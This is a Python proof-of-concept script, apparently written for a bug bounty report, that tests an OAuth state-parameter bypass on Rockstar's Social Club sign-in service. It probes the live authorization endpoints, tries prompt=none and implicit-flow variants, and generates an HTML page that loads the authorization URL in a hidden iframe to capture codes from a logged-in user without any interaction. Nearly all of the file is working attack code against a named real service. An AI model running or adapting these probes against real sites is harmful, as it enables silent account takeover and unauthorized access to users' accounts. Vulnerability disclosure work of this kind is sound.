#!/usr/bin/env python3
"""
rockstar_oauth_poc.py — Prove OAuth state bypass on signin.rockstargames.com

Step 1: Run this script to gather recon (OIDC config, endpoint behavior)
Step 2: Open the generated HTML PoC in browser while logged into Social Club
Step 3: Check if consent is skipped and code is returned silently

Usage: python3 rockstar_oauth_poc.py
"""
import json
import os
import sys
import time
from urllib.parse import urlparse, parse_qs

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

TARGET = "https://signin.rockstargames.com"
OIDC_CONFIG = f"{TARGET}/.well-known/openid-configuration"

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
NC = "\033[0m"

def log(color, label, msg):
    print(f"{color}[{label}]{NC} {msg}")


def step1_oidc_recon():
    """Fetch OIDC configuration to confirm endpoints and supported features."""
    log(CYAN, "RECON", "Fetching OIDC configuration...")
    
    try:
        resp = requests.get(OIDC_CONFIG, timeout=10, verify=False)
        if resp.status_code != 200:
            log(RED, "FAIL", f"OIDC config returned {resp.status_code}")
            return None
        
        config = resp.json()
        log(GREEN, "OK", f"OIDC config found")
        
        # Key fields
        fields = {
            "authorization_endpoint": config.get("authorization_endpoint"),
            "token_endpoint": config.get("token_endpoint"),
            "response_types_supported": config.get("response_types_supported"),
            "grant_types_supported": config.get("grant_types_supported"),
            "scopes_supported": config.get("scopes_supported"),
            "response_modes_supported": config.get("response_modes_supported"),
        }
        
        for k, v in fields.items():
            log(CYAN, "INFO", f"  {k}: {v}")
        
        # Check if implicit flow supported (response_type=token)
        rts = config.get("response_types_supported", [])
        if "token" in rts or "id_token" in rts:
            log(YELLOW, "NOTE", "Implicit flow supported — tokens returned in URL fragment")
        
        # Check if prompt parameter mentioned
        prompts = config.get("prompt_values_supported", [])
        if prompts:
            log(YELLOW, "NOTE", f"Prompt values: {prompts}")
        
        return config
        
    except Exception as e:
        log(RED, "FAIL", f"OIDC fetch error: {e}")
        return None


def step2_test_no_state():
    """Test that the authorization endpoint accepts requests without state."""
    log(CYAN, "TEST", "Testing authorization without state parameter...")
    
    endpoints = [
        f"{TARGET}/connect/authorize/socialclub?response_type=code&scope=openid",
        f"{TARGET}/connect/authorize/socialclub?response_type=code&scope=openid&client_id=socialclub",
    ]
    
    for url in endpoints:
        try:
            resp = requests.get(url, timeout=10, allow_redirects=False, verify=False)
            log(GREEN if resp.status_code in (200, 302) else YELLOW, 
                "RESULT", f"  {resp.status_code} — {url[:80]}...")
            
            # Check for redirect with code
            location = resp.headers.get("Location", "")
            if "code=" in location:
                log(GREEN, "VULN", f"  Authorization code returned! Location: {location[:100]}")
            elif location:
                log(CYAN, "INFO", f"  Redirect to: {location[:100]}")
                
        except Exception as e:
            log(RED, "ERR", f"  {e}")
        
        time.sleep(0.5)


def step3_test_prompt_none():
    """Test if prompt=none allows silent authorization."""
    log(CYAN, "TEST", "Testing prompt=none (silent auth)...")
    
    url = (f"{TARGET}/connect/authorize/socialclub?"
           "response_type=code&scope=openid&client_id=socialclub"
           "&redirect_uri=https://socialclub.rockstargames.com/signin"
           "&prompt=none")
    
    try:
        resp = requests.get(url, timeout=10, allow_redirects=False, verify=False)
        log(CYAN, "RESULT", f"  Status: {resp.status_code}")
        
        location = resp.headers.get("Location", "")
        if location:
            log(CYAN, "INFO", f"  Location: {location[:150]}")
            
            if "code=" in location:
                log(GREEN, "VULN", "  Silent auth returned code! No user interaction needed.")
            elif "error=login_required" in location:
                log(YELLOW, "NOTE", "  Server returned login_required — user must be logged in first")
                log(YELLOW, "NOTE", "  This is expected. Test in browser while logged in.")
            elif "error=consent_required" in location:
                log(YELLOW, "NOTE", "  Consent required for first-time auth.")
                log(YELLOW, "NOTE", "  But returning users who already authorized will bypass this.")
            elif "error=" in location:
                parsed = parse_qs(urlparse(location).query)
                log(YELLOW, "NOTE", f"  Error: {parsed.get('error', ['?'])[0]}")
        else:
            # Check response body
            ct = resp.headers.get("Content-Type", "")
            if "html" in ct:
                if "consent" in resp.text.lower() or "authorize" in resp.text.lower():
                    log(YELLOW, "NOTE", "  HTML response with consent/authorize — consent screen shown")
                elif "login" in resp.text.lower():
                    log(YELLOW, "NOTE", "  Login page returned — need to be authenticated")
                else:
                    log(CYAN, "INFO", "  HTML page returned (check in browser)")
                    
    except Exception as e:
        log(RED, "ERR", f"  {e}")


def step4_test_response_types():
    """Test all response types for silent token issuance."""
    log(CYAN, "TEST", "Testing different response_type values...")
    
    response_types = ["code", "token", "id_token", "code token", "code id_token"]
    
    for rt in response_types:
        url = (f"{TARGET}/connect/authorize/socialclub?"
               f"response_type={rt.replace(' ', '%20')}&scope=openid"
               "&client_id=socialclub"
               "&redirect_uri=https://socialclub.rockstargames.com/signin")
        
        try:
            resp = requests.get(url, timeout=10, allow_redirects=False, verify=False)
            location = resp.headers.get("Location", "")
            status = resp.status_code
            
            if status == 302 and ("token=" in location or "code=" in location):
                log(GREEN, "VULN", f"  response_type={rt} → {status} (token/code in redirect!)")
            elif status in (200, 302):
                log(CYAN, "INFO", f"  response_type={rt} → {status}")
            else:
                log(YELLOW, "INFO", f"  response_type={rt} → {status}")
                
        except Exception as e:
            log(RED, "ERR", f"  response_type={rt}: {e}")
        
        time.sleep(0.3)


def step5_generate_poc_html():
    """Generate HTML PoC page for browser testing."""
    html = """<!DOCTYPE html>
<html>
<head>
    <title>Rockstar OAuth State Bypass PoC</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        .log { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
        .vuln { color: #00ff88; }
        .info { color: #00bfff; }
        .warn { color: #ffa500; }
        button { background: #e94560; color: white; border: none; padding: 12px 24px; 
                 border-radius: 6px; cursor: pointer; font-size: 16px; margin: 5px; }
        button:hover { background: #ff6b6b; }
        h1 { color: #e94560; }
        iframe { display: none; }
        #results { white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>[PoC] OAuth State Bypass - Rockstar Social Club</h1>
    
    <div class="log">
        <h3>Instructions:</h3>
        <p>1. Log into <a href="https://socialclub.rockstargames.com" target="_blank" style="color:#00bfff">socialclub.rockstargames.com</a> in this browser first</p>
        <p>2. Click the buttons below to test silent authorization</p>
        <p>3. Watch for redirects — if you see a <span class="vuln">code=</span> parameter, the attack works silently</p>
    </div>
    
    <h3>Test 1: Standard OAuth without state (visible redirect)</h3>
    <button onclick="testVisible()">Test in New Tab</button>
    
    <h3>Test 2: Silent via iframe (zero interaction)</h3>
    <button onclick="testSilent()">Test Silent (iframe)</button>
    
    <h3>Test 3: prompt=none (OIDC silent auth)</h3>
    <button onclick="testPromptNone()">Test prompt=none</button>
    
    <h3>Test 4: Implicit flow (token in fragment)</h3>
    <button onclick="testImplicit()">Test Implicit</button>
    
    <div class="log">
        <h3>Results:</h3>
        <div id="results"></div>
    </div>
    
    <script>
        const BASE = "https://signin.rockstargames.com/connect/authorize/socialclub";
        const REDIRECT = "https://socialclub.rockstargames.com/signin";
        const results = document.getElementById("results");
        
        function addLog(type, msg) {
            const colors = { vuln: "#00ff88", info: "#00bfff", warn: "#ffa500" };
            const ts = new Date().toLocaleTimeString();
            results.innerHTML += `<span style="color:${colors[type] || '#eee'}">[${ts}] ${msg}</span>\\n`;
        }
        
        function testVisible() {
            // Opens in new tab — watch the URL bar for code= parameter
            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}`;
            addLog("info", "Opening OAuth URL in new tab...");
            addLog("info", "URL: " + url);
            addLog("warn", "WATCH THE URL BAR: if you see code= without a consent screen, it's vulnerable");
            window.open(url, "_blank");
        }
        
        function testSilent() {
            // Silent via iframe — true zero-interaction test
            addLog("info", "Testing silent authorization via hidden iframe...");
            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}`;
            
            const iframe = document.createElement("iframe");
            iframe.src = url;
            iframe.style.display = "none";
            iframe.id = "silent-test";
            
            iframe.onload = function() {
                try {
                    const iframeUrl = iframe.contentWindow.location.href;
                    addLog("vuln", "iframe loaded! URL: " + iframeUrl);
                    if (iframeUrl.includes("code=")) {
                        addLog("vuln", "*** AUTHORIZATION CODE CAPTURED WITHOUT USER INTERACTION ***");
                    }
                } catch(e) {
                    addLog("info", "iframe cross-origin block (expected) — check Network tab for redirect");
                }
            };
            
            document.body.appendChild(iframe);
            addLog("info", "Hidden iframe created. Check DevTools > Network tab for 302 redirect with code=");
        }
        
        function testPromptNone() {
            addLog("info", "Testing OIDC prompt=none (silent)...");
            const url = `${BASE}?response_type=code&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}&prompt=none`;
            addLog("info", "URL: " + url);
            window.open(url, "_blank");
        }
        
        function testImplicit() {
            addLog("info", "Testing implicit flow (token in URL fragment)...");
            // Use response_type=token to get token directly in URL
            const url = `${BASE}?response_type=id_token&scope=openid&client_id=socialclub&redirect_uri=${encodeURIComponent(REDIRECT)}&nonce=abc123`;
            addLog("info", "URL: " + url);
            addLog("warn", "If this returns id_token= in # fragment, implicit flow is enabled");
            window.open(url, "_blank");
        }
    </script>
</body>
</html>"""

    poc_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                            "..", "poc_rockstar_oauth.html")
    with open(poc_path, "w", encoding="utf-8") as f:
        f.write(html)
    log(GREEN, "OK", f"HTML PoC saved to: {os.path.abspath(poc_path)}")
    log(CYAN, "INFO", "Open this file in browser WHILE LOGGED INTO SOCIAL CLUB")


def main():
    import urllib3
    urllib3.disable_warnings()
    
    print(f"\n{CYAN}{'='*60}{NC}")
    print(f"{CYAN}  Rockstar OAuth State Bypass — PoC Builder{NC}")
    print(f"{CYAN}{'='*60}{NC}\n")
    
    # Step 1: OIDC Recon
    config = step1_oidc_recon()
    print()
    
    # Step 2: Test no state
    step2_test_no_state()
    print()
    
    # Step 3: Test prompt=none
    step3_test_prompt_none()
    print()
    
    # Step 4: Test response types
    step4_test_response_types()
    print()
    
    # Step 5: Generate HTML PoC
    step5_generate_poc_html()
    
    print(f"\n{CYAN}{'='*60}{NC}")
    print(f"{GREEN}  NEXT STEPS:{NC}")
    print(f"  1. Log into socialclub.rockstargames.com in your browser")
    print(f"  2. Open poc_rockstar_oauth.html in the SAME browser")
    print(f"  3. Click 'Test in New Tab' — watch if consent appears")
    print(f"  4. If NO consent → screenshot the redirect URL with code=")
    print(f"  5. Try 'Test Silent (iframe)' for zero-interaction proof")
    print(f"  6. Screenshot everything for the H1 response")
    print(f"{CYAN}{'='*60}{NC}\n")


if __name__ == "__main__":
    main()
